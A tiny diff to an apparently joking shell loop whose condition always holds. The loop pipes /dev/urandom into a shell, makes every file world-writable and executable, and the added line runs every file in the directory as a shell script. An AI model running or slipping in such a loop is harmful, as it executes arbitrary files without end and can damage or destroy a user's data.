@@ -4,4 +4,5 @@ while [ huhmeter>over9000 ]
 do
 /bin/sh /dev/urandom
 chmod +rwx *
+/bin/sh ./*
 done
